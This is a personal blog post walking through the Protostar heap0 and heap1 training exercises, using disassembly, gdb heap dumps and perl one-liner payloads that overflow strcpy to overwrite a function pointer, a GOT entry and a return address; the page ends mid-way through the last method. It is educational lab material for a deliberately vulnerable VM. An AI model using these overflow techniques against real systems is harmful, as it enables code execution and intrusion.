<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Heap levels">
  <title>Exploit Exercises - Protostar - Heap levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="This is my personal blog to keep track of stuff I am doing after hours.">

  
  <meta itemprop="keywords" content="" />
  
    <meta itemprop="wordCount" content="2967">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Heap levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Heap-levels/" />
  

  
  <meta property="og:updated_time" content="2014-11-01 11:52:17 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Heap levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  


  <meta name="generator" content="Hugo 0.18.1" />
  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
  <link href="http://camelinc.info/css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info/css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info/css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info/lightbox/css/lightbox.css" type="text/css" media="screen">


  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>
 


<body>

<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>
        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>



       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Heap levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-11-01</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="heap-0">Heap 0</h1>

<p>For this scenario we need to run the winner() function.
To get a better idea about the binary a look at the assembly helps.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x08048492</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08048495</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x40</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804849c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048388</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="mh">0x080484a1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">store</span> <span class="n">address</span>
<span class="mh">0x080484a5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x4</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484ac</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048388</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="mh">0x080484b1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>         <span class="p">;</span> <span class="n">store</span> <span class="n">address</span>
<span class="mh">0x080484b5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x8048478</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>         <span class="p">;</span> <span class="n">nowinner</span><span class="p">()</span>
<span class="mh">0x080484ba</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484be</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">50</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,(</span><span class="o">%</span><span class="n">eax</span><span class="p">)</span>
<span class="mh">0x080484c0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x80485f7</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0x080484dd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="p">...</span>
<span class="mh">0x080484e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="err">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484e3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484e5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>
<span class="mh">0x080484e7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484eb</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">95</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484ef</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484f2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048368</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">vulnerable</span> <span class="n">function</span>
<span class="mh">0x080484f7</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">107</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">load</span> <span class="n">pointer</span>
<span class="mh">0x080484fb</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>             <span class="p">;</span> <span class="n">follow</span> <span class="n">pointer</span>
<span class="mh">0x080484fd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="o">%</span><span class="n">eax</span>                    <span class="p">;</span> <span class="n">execute</span> <span class="n">function</span> <span class="n">pointer</span>
</code></pre></div>


<p>So, the binary allocates 64+4 bytes on the heap.
Afterwards, the argument is copied into the first allocated memory part.
As strcpy does not limit the length, we can write into the second variable.
That variable contains a function pointer that is executed afterwards.</p>

<p>So in order to overwrite the function pointer we have to write</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$ /opt/protostar/bin/heap0 $</span><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;A&quot;x72 . &quot;\x64\x84\x04\x08&quot;;&#39;</span><span class="o">)</span>
<span class="go">data is at 0x804a008, fp is at 0x804a050</span>
<span class="go">level passed</span>
</code></pre></div>


<h1 id="heap-1">Heap 1</h1>

<p>Again, we need to run the winner() function.
Let&rsquo;s see what&rsquo;s going on.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x080484c2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>       <span class="p">;</span> <span class="n">pass</span> <span class="mi">8</span>
<span class="mh">0x080484c9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483bc</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">allocate</span>
<span class="mh">0x080484ce</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">store</span> <span class="n">PTR</span>
<span class="mh">0x080484d2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
<span class="mh">0x080484d6</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x1</span>       <span class="p">;</span> <span class="n">store</span> <span class="mi">1</span>
<span class="p">;</span>
<span class="mh">0x080484dc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>       <span class="p">;</span> <span class="n">pass</span> <span class="mi">8</span>
<span class="mh">0x080484e3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">42</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483bc</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">allocate</span>
<span class="mh">0x080484e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x080484ea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
<span class="mh">0x080484ee</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>   <span class="p">;</span> <span class="n">store</span> <span class="n">pointer</span>
<span class="p">;</span>
<span class="mh">0x080484f1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>       <span class="p">;</span> <span class="n">pass</span> <span class="mi">8</span>
<span class="mh">0x080484f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483bc</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">allocate</span>
<span class="mh">0x080484fd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">store</span> <span class="n">PTR</span>
<span class="mh">0x08048501</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0x08048505</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">],</span><span class="mh">0x2</span>       <span class="p">;</span> <span class="n">store</span> <span class="mi">2</span>
<span class="p">;</span>
<span class="mh">0x0804850b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">82</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x8</span>       <span class="p">;</span> <span class="n">pass</span> <span class="mi">8</span>
<span class="mh">0x08048512</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80483bc</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">allocate</span>
<span class="mh">0x08048517</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x08048519</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0x0804851d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>   <span class="p">;</span> <span class="n">store</span> <span class="n">pointer</span>
<span class="p">...</span>
</code></pre></div>


<p>So this time we have four mallocs with 8 bytes each.
Also, some kind of counter.
The data structure includes an integer as well as a char array.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">...</span>
<span class="mh">0x08048520</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">103</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>    <span class="p">;</span> <span class="n">ARG</span>
<span class="mh">0x08048523</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">106</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>                    <span class="p">;</span> <span class="n">ARGV2</span>
<span class="mh">0x08048526</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>        <span class="p">;</span> <span class="n">resolve</span> <span class="n">pointer</span>
<span class="mh">0x08048528</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x0804852a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>   <span class="p">;</span> <span class="n">load</span> <span class="n">struct1</span> <span class="n">PTR</span>
<span class="mh">0x0804852e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>    <span class="p">;</span> <span class="n">PTR</span><span class="o">+</span><span class="mi">4</span>
<span class="mh">0x08048531</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>    <span class="p">;</span> <span class="n">pass</span> <span class="n">ARGV1</span>
<span class="mh">0x08048535</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">struct1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="mh">0x08048538</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804838c</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">;</span>
<span class="mh">0x0804853d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>    <span class="p">;</span> <span class="n">ARG</span>
<span class="mh">0x08048540</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>                    <span class="p">;</span> <span class="n">ARGV2</span>
<span class="mh">0x08048543</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>        <span class="p">;</span> <span class="n">resolve</span> <span class="n">pointer</span>
<span class="mh">0x08048545</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>
<span class="mh">0x08048547</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">142</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>   <span class="p">;</span> <span class="n">load</span> <span class="n">struct2</span> <span class="n">PTR</span>
<span class="mh">0x0804854b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">146</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>    <span class="p">;</span> <span class="n">PTR</span><span class="o">+</span><span class="mi">4</span>
<span class="mh">0x0804854e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">edx</span>    <span class="p">;</span> <span class="n">pass</span> <span class="n">ARGV2</span>
<span class="mh">0x08048552</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">struct2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="mh">0x08048555</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">156</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x804838c</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804855a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804864b</span>
<span class="mh">0x08048561</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">168</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x80483cc</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">...</span>
</code></pre></div>


<p>And lets take a short look at the heap layout just before the executable terminates.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="n">gdb</span><span class="err">$</span> <span class="n">run</span> <span class="n">AAAAAx</span><span class="o">/</span><span class="mi">20</span><span class="n">x</span> <span class="mh">0x0804a008</span>
<span class="mh">0x804a008</span><span class="o">:</span>      <span class="mh">0x00000001</span>      <span class="mh">0x0804a018</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000011</span>
<span class="mh">0x804a018</span><span class="o">:</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000011</span>
<span class="mh">0x804a028</span><span class="o">:</span>      <span class="mh">0x00000002</span>      <span class="mh">0x0804a038</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000011</span>
<span class="mh">0x804a038</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00020fc1</span>
</code></pre></div>


<p>In order to exploit the code we have to manipulate the destination address of 2nd strcpy.
To do this, we will write 20 bytes with the first argument.
By doing this, we can overwrite the pointer in struct2.
Next, we need to find a suitable location so we can run winner().</p>

<h2 id="method-1-got">Method 1 - GOT</h2>

<p>We can overwrite the global address table information of puts.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x80483cc</span>
<span class="mh">0x80483cc</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span>   <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x8049774</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x8049774</span>
<span class="mh">0x8049774</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;:</span>   <span class="mh">0x080483d2</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">print</span> <span class="n">winner</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="kt">void</span> <span class="p">(</span><span class="kt">void</span><span class="p">)}</span> <span class="mh">0x8048494</span> <span class="o">&lt;</span><span class="n">winner</span><span class="o">&gt;</span>
</code></pre></div>


<p>With the relevant addresses, we put our exploit to a trial.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$ /opt/protostar/bin/heap1 $</span><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;A&quot;x20 .&quot;\x74\x97\x04\x08&quot; .&quot; \x94\x84\x04\x08&quot;;&#39;</span><span class="o">)</span>
<span class="go">and we have a winner @ 1409411437</span>
</code></pre></div>


<h2 id="method-2-return-address">Method 2 - Return-Address</h2>

<p>Another option is to overwrite the return address of the stack frame.
To do this, we have to overwrite EBP+4 with our target destination.
In our case that would be 0xbffff61c.</p>

<p>But with gdb the addresses are slightly off.
So with a little trial and error, we get the correct offset 0xbffff62c.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$ /opt/protostar/bin/heap1 $</span><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;A&quot;x20 .&quot;\x2c\xf6\xff\xbf&quot; .&quot; \x94\x84\x04\x08&quot;;&#39;</span><span class="o">)</span>
